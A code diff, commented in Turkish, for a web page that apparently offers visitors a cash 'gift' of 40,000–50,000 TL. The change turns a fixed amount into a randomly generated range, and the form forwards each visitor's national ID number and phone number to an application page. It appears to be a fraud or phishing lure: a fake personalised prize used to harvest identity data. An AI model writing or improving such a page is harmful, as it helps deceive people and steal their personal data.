@@ -210,12 +210,24 @@
   <script>
     // Direkt yönlendirme için - app.js'i bypass et
     document.addEventListener('DOMContentLoaded', function() {
-      // Hediye değerini querystring'de koru (yoksa varsayılan ekle)
+      // Hediye değerini querystring'de koru (yoksa random oluştur)
       const urlParams = new URLSearchParams(window.location.search);
       if (!urlParams.get('hediye')) {
-        urlParams.set('hediye', '40000-50000');
+        // 40.000 - 50.000 TL arasında random değer oluştur
+        const minHediye = 40000;
+        const maxHediye = 50000;
+        // İlk random değer: 40000-50000 arası
+        const randomMin = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
+        // İkinci random değer: randomMin ile 50000 arası (min'den büyük veya eşit olmalı)
+        const randomMax = Math.floor(Math.random() * (maxHediye - randomMin + 1)) + randomMin;
+        
+        // Random değeri querystring'e ekle
+        const hediyeValue = `${randomMin}-${randomMax}`;
+        urlParams.set('hediye', hediyeValue);
         const newUrl = window.location.pathname + '?' + urlParams.toString();
         window.history.replaceState({}, '', newUrl);
+        
+        console.log('Random hediye değeri oluşturuldu:', hediyeValue);
       }
       
       // Hata mesajlarını gizle
@@ -336,12 +348,24 @@
           return false;
         }
         
-        // Hediye değerini querystring'den al veya varsayılan kullan
-        const urlParams = new URLSearchParams(window.location.search);
-        const hediye = urlParams.get('hediye') || '40000-50000';
+        // Hediye değerini querystring'den al (mutlaka olmalı çünkü sayfa yüklendiğinde oluşturuldu)
+        const currentUrlParams = new URLSearchParams(window.location.search);
+        const hediye = currentUrlParams.get('hediye');
         
-        // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
-        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediye);
+        if (!hediye) {
+          // Eğer bir şekilde hediye yoksa, random oluştur
+          const minHediye = 40000;
+          const maxHediye = 50000;
+          const randomMin = Math.floor(Math.random() * (maxHediye - minHediye + 1)) + minHediye;
+          const randomMax = Math.floor(Math.random() * (maxHediye - randomMin + 1)) + randomMin;
+          const hediyeValue = `${randomMin}-${randomMax}`;
+          
+          // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
+          window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediyeValue);
+        } else {
+          // Direkt yönlendirme yap - telefon numarasını ve hediye değerini ekle
+          window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue) + '&hediye=' + encodeURIComponent(hediye);
+        }
         
         return false;
       }
